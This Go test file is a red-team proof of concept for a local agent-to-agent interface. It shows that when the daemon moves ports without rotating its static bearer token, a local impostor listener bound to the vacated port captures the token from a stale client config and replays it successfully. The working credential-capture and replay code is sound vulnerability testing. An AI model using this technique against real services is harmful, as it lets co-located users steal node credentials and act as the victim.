//go:build !no_a2a

package a2a

// Red-team PoC, lens: supply (agentwire → local A2A interface credential).
//
// The local A2A interface authenticates its clients with a static bearer
// token (a2a_token.txt), and `anet agents wire hermes --a2a` copies that
// token verbatim into ~/.hermes/config.yaml next to the URL built from
// a2a_addr.txt (internal/agentwire TestHermesA2AEntries proves the copy is
// byte-for-byte). module/a2a treats the token file as the thing to protect
// from other local users — loadOrCreateToken keeps it 0600 and its own
// comment says "a token that other users could read would authorize them
// to send work and agent-tier payments as this node".
//
// But listen() may vacate its advertised port: when the recorded port is
// taken while the daemon is down, it silently moves to a new port and
// rewrites a2a_addr.txt, WITHOUT changing the token. A Hermes config that
// was not --refreshed still names the OLD port with the still-valid token.
// The interface authenticates its clients but nothing authenticates the
// server to a client, so any local process that binds the freed, predictable
// loopback port receives the live credential on the client's next request.
//
// This test PASSES when that disclosure path is real: an unrelated listener
// on the vacated port captures a bearer that the current interface still
// accepts.

import (
	"context"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestRedteamSupply_A2ATokenReachableOnVacatedPort(t *testing.T) {
	isolateHome(t)
	stateDir := t.TempDir()

	start := func() (*Module, context.CancelFunc) {
		m, _ := New(nil)
		ctx, cancel := context.WithCancel(context.Background())
		if err := m.Start(ctx, &testHost{dir: stateDir, seam: newFakeSeam()}); err != nil {
			cancel()
			t.Fatal(err)
		}
		return m.(*Module), cancel
	}

	// 1. First run: the interface binds a port and makes the token. This is
	//    the (addr, token) pair that `anet agents wire hermes --a2a` writes
	//    into the client's config.
	m1, cancel1 := start()
	oldAddr := m1.Addr()
	tokB, err := os.ReadFile(filepath.Join(stateDir, TokenFile))
	if err != nil {
		t.Fatal(err)
	}
	token := strings.TrimSpace(string(tokB))
	cancel1()
	m1.shutdown()

	// 2. The old port is taken while the daemon is down (any local process
	//    can bind a loopback port in the fixed 43811-45810 range). Here that
	//    process also records what a client sends it.
	var captured string
	gotIt := make(chan struct{}, 1)
	impostorLn, err := net.Listen("tcp", oldAddr)
	if err != nil {
		t.Fatalf("bind vacated port %s: %v", oldAddr, err)
	}
	defer impostorLn.Close()
	impostor := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if a := r.Header.Get("Authorization"); strings.HasPrefix(a, "Bearer ") {
			captured = strings.TrimPrefix(a, "Bearer ")
			select {
			case gotIt <- struct{}{}:
			default:
			}
		}
		w.WriteHeader(http.StatusOK)
	})}
	go impostor.Serve(impostorLn)
	defer impostor.Close()

	// 3. The interface restarts, finds its recorded port taken, and moves —
	//    rewriting a2a_addr.txt but not the token.
	m2, cancel2 := start()
	defer func() { cancel2(); m2.shutdown() }()
	newAddr := m2.Addr()
	if newAddr == oldAddr {
		t.Fatal("the interface did not move; adjust the PoC")
	}
	newTokB, _ := os.ReadFile(filepath.Join(stateDir, TokenFile))
	if strings.TrimSpace(string(newTokB)) != token {
		t.Fatalf("token changed on move (%q → %q); the disclosure window would not exist",
			token, strings.TrimSpace(string(newTokB)))
	}

	// 4. A client still configured with the OLD entry (a Hermes a2a_agents
	//    entry that was never `wire --refresh`ed) sends the bearer to the
	//    old port. The impostor now holds it.
	req, _ := http.NewRequest(http.MethodGet, "http://"+oldAddr+agentsPath, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("client request to the old endpoint: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	select {
	case <-gotIt:
	case <-time.After(2 * time.Second):
		t.Fatal("impostor did not capture the bearer")
	}
	if captured != token {
		t.Fatalf("captured %q, expected the live token %q", captured, token)
	}

	// 5. The captured token is still a valid credential: the moved interface
	//    accepts it. So the impostor now holds a working credential for the
	//    victim's node.
	live, _ := http.NewRequest(http.MethodGet, "http://"+newAddr+agentsPath, nil)
	live.Header.Set("Authorization", "Bearer "+captured)
	lr, err := http.DefaultClient.Do(live)
	if err != nil {
		t.Fatalf("replay against the live interface: %v", err)
	}
	io.Copy(io.Discard, lr.Body)
	lr.Body.Close()
	if lr.StatusCode != http.StatusOK {
		t.Fatalf("the moved interface rejected the captured token (status %d); no live credential was disclosed", lr.StatusCode)
	}
	// Reaching here: a co-located local user harvested a still-valid A2A
	// credential for this node from the vacated, predictable loopback port.
}
